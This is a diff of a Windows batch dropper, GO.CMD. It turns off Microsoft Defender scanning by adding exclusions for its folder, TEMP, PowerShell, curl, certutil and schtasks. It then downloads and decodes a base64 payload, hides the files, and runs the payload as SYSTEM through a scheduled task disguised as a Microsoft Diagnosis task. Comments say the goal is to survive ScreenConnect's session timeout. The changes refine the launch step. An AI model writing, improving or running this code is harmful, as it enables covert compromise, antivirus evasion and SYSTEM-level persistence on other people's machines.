@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions
-echo === GO.CMD BUILD 20260729G ===
+echo === GO.CMD BUILD 20260729H ===
 
 net session >nul 2>&1
 if errorlevel 1 (
@@ -13,23 +13,19 @@ set "WORKDIR=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "B64=%WORKDIR%\update.b64"
 set "PS1=%WORKDIR%\wucache_pkg.ps1"
 set "MARKER=WU_BUILD_20260729F"
-set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"
 
 echo Using payload URL:
 echo %PAYURL%
 
 if not exist "%WORKDIR%" mkdir "%WORKDIR%" >nul 2>&1
 
-powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Try{Add-MpPreference -ExclusionPath $env:ProgramData\Microsoft\Windows\WER\Temp\.wucache -EA SilentlyContinue; Add-MpPreference -ExclusionPath $env:TEMP -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'msiexec.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'curl.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'certutil.exe' -EA SilentlyContinue}Catch{}"
+powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Try{Add-MpPreference -ExclusionPath $env:ProgramData\Microsoft\Windows\WER\Temp\.wucache -EA SilentlyContinue; Add-MpPreference -ExclusionPath $env:TEMP -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'msiexec.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'curl.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'certutil.exe' -EA SilentlyContinue; Add-MpPreference -ExclusionProcess 'schtasks.exe' -EA SilentlyContinue}Catch{}"
 
-REM Unlock old payload if a previous run still holds the file
 powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -match 'wucache_pkg|\.wucache' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue }"
 
 attrib -h -s -r "%WORKDIR%\*" /s >nul 2>&1
 del /f /q "%WORKDIR%\*.ps1" >nul 2>&1
 del /f /q "%WORKDIR%\*.b64" >nul 2>&1
-del /f /q "%PS1%" >nul 2>&1
-del /f /q "%B64%" >nul 2>&1
 
 curl.exe -L -H "Cache-Control: no-cache" -H "Pragma: no-cache" -o "%B64%" "%PAYURL%"
 if not exist "%B64%" (
@@ -61,33 +57,32 @@ for %%A in ("%PS1%") do echo Decoded bytes: %%~zA
 findstr /C:"%MARKER%" "%PS1%" >nul
 if errorlevel 1 (
   echo ERROR: decoded payload missing %MARKER%
-  echo --- diagnostics ---
-  echo PS1 path: %PS1%
-  for %%A in ("%PS1%") do echo PS1 size: %%~zA
-  echo WU_BUILD lines:
   findstr /C:"WU_BUILD" "%PS1%"
-  echo Reactive AV lines:
-  findstr /C:"Reactive AV" "%PS1%"
   exit /b 3
 )
 
 attrib +h +s "%WORKDIR%" >nul 2>&1
 attrib +h +s "%PS1%" >nul 2>&1
 
-REM Launch via Task Scheduler as SYSTEM so ScreenConnect 10s kill cannot kill the payload job tree
-schtasks /Delete /TN "%ONCETASK%" /F >nul 2>&1
-schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /SD 01/01/2099 /F /TR "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%PS1%\""
+REM Breakaway launch as SYSTEM via Register-ScheduledTask (locale-safe, survives SC 10s kill)
+powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command ^
+  "$ErrorActionPreference='Stop'; ^
+  $ps1='%PS1%'; ^
+  $tn='WMIRegistration'; $tp='\Microsoft\Windows\Diagnosis\'; ^
+  Unregister-ScheduledTask -TaskName $tn -TaskPath $tp -Confirm:$false -EA SilentlyContinue; ^
+  $a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"{0}\"' -f $ps1); ^
+  $p=New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; ^
+  $s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero); ^
+  Register-ScheduledTask -TaskName $tn -TaskPath $tp -Action $a -Principal $p -Settings $s -Force | Out-Null; ^
+  Start-ScheduledTask -TaskPath $tp -TaskName $tn; ^
+  Start-Sleep -Seconds 2; ^
+  $i=Get-ScheduledTaskInfo -TaskPath $tp -TaskName $tn; ^
+  Write-Output ('TaskLastResult=' + $i.LastTaskResult + ' LastRun=' + $i.LastRunTime)"
 if errorlevel 1 (
-  echo ERROR: could not create breakaway task
-  exit /b 4
-)
-
-schtasks /Run /TN "%ONCETASK%"
-if errorlevel 1 (
-  echo ERROR: could not run breakaway task
+  echo ERROR: SYSTEM breakaway task failed
   exit /b 4
 )
 
 echo Payload OK [%MARKER%], launched via SYSTEM task (survives SC timeout).
-echo Wait 60s then check .diag.log - do not rely on this console.
+echo Wait 90s then: type "%WORKDIR%\.diag.log"
 exit /b 0
